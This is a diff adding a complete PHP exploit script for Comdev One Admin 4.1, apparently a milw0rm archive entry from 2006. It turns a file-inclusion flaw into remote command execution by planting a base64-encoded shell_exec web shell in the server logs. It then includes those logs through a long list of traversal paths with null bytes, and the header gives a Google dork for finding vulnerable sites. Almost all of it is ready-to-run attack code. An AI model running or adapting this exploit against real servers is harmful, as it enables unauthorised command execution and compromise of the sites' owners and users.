@@ -1,0 +1,134 @@
+#!/usr/bin/php
+<?php
+ /*********************************************************************
+ * Comdev One Admin 4.1 Remote Command Execution / File Inclusion Vulnerability
+ * 
+ * Note:
+ * Requires register globals to be on, and magic quotes gpc to be off.
+ *
+ * Usage: 
+ * php script.php [host] [path] [command]
+ *
+ * Usage Example:
+ * php script.php domain.com /oneadminpro/ whoami
+ *
+ * Credit:
+ * Synsta - Vulnerability discovery and exploit scripting
+ *
+ * File Inclusion:
+ * <host>/<path>/oneadmin/adminfoot.php?path[docroot]=<local/remote file>
+ *
+ * Googledork: inurl:/oneadmin/
+ *
+ * [w4ck1ng] - w4ck1ng.com
+ *
+ *********************************************************************/
+ 
+if(!$argv[3 ]){
+die("Usage:
+php $argv[0] [host] [path] [command]\n
+Usage Example:
+php $argv[0] domain.com /dolphin/ whoami\n");
+}
+
+function send($host, $put){
+global $data;
+$conn = fsockopen( gethostbyname($host),"80" );
+if(!$conn) {
+die("Connection to $host failed...");
+}else{
+fputs($conn, $put);
+}
+while(!feof($conn)) {
+$data .=fgets( $conn);
+}
+fclose($conn);
+return $data;
+}
+
+$host = $argv[ 1];
+$path = $argv[ 2];
+$cmd = $argv[ 3];
+
+if($argv[3]){
+
+$shellcode = base64_decode( "PD9waHAgaWYoJF9TRVJWRVJbSFRUUF9DTURdKXsgZWNobyBjbWR4cGxzdGFydC5zaGVsbF9leGVjKHN0cmlwc2xhc2hlcygkX1NFUlZFUltIVFRQX0NNRF0pKS5jbWR4cGxlbmQ7IH0gPz4=");
+$req = "GET ". $path."/oneadmin/adminfoot.php?path[docroot]=$shellcode HTTP/1.1\r\n";
+$req .="Accept-Encoding: text/plain\r\n" ;
+$req .="Host: ". $host."\r\n";
+$req .="Connection: Close\r\n\r\n" ;
+send("$host", "$req");
+
+$logs = array("../../../../../var/log/httpd/access_log" ,
+"../../../../../var/log/httpd/error_log",
+"../apache/logs/error.log",
+"../apache/logs/access.log",
+"../../apache/logs/error.log",
+"../../apache/logs/access.log",
+"../../../apache/logs/error.log",
+"../../../apache/logs/access.log",
+"../../../logs/access_log",
+"../../../logs/error_log",
+"../../../../apache/logs/error.log",
+"../../../../apache/logs/access.log",
+"../../../../../apache/logs/error.log",
+"../../../../../apache/logs/access.log",
+"../logs/error.log",
+"../logs/access.log",
+"../../logs/error.log",
+"../../logs/access.log",
+"../../../logs/error.log",
+"../../../logs/access.log",
+"../../../../logs/error.log",
+"../../../../logs/access.log",
+"../../../../../logs/error.log",
+"../../../../../logs/access.log",
+"../../../../../etc/httpd/logs/access_log",
+"../../../../../etc/httpd/logs/access.log",
+"../../../../../etc/httpd/logs/error_log",
+"../../../../../etc/httpd/logs/error.log",
+"../../../../../var/www/logs/access_log",
+"../../../../../var/www/logs/access.log",
+"../../../../../usr/local/apache/logs/access_log",
+"../../../../../usr/local/apache/logs/access.log",
+"../../../../../var/log/apache/access_log",
+"../../../../../var/log/apache/access.log",
+"../../../../../var/log/access_log",
+"../../../../../var/www/logs/error_log",
+"../../../../../var/www/logs/error.log",
+"../../../../../usr/local/apache/logs/error_log",
+"../../../../../usr/local/apache/logs/error.log",
+"../../../../../var/log/apache/error_log",
+"../../../../../var/log/apache/error.log",
+"../../../../../var/log/access_log",
+"../../../../../var/log/error_log");
+
+$i = 0; 
+foreach($logs as $value){ 
+$logs[$i++];
+
+$req = "GET ". $path."/oneadmin/adminfoot.php?path[docroot]=$logs[$i]%00 HTTP/1.1\r\n";
+$req .="CMD: $cmd\r\n";
+$req .="Accept-Encoding: text/plain\r\n" ;
+$req .="Host: ". $host."\r\n";
+$req .="Connection: Close\r\n\r\n" ;
+send("$host", "$req");
+print("Trying $logs[$i]..\n");
+
+$adata = explode( "cmdxplstart",$data);
+$bdata = explode( "cmdxplend",$adata[1 ]);
+$cdata = $bdata[ 0];
+
+if(eregi("cmdxplend",  $data)){ 
+if($cdata==NULL){ 
+die("\nExploit succeeded but blank command received..\n"); 
+}
+die("\nExploit Succeeded!\n\nCommand Resolution:\n$cdata\n"); 
+}
+}
+}
+
+die("Exploit Failed!\n");
+?>
+
+# milw0rm.com [2006-10-16]
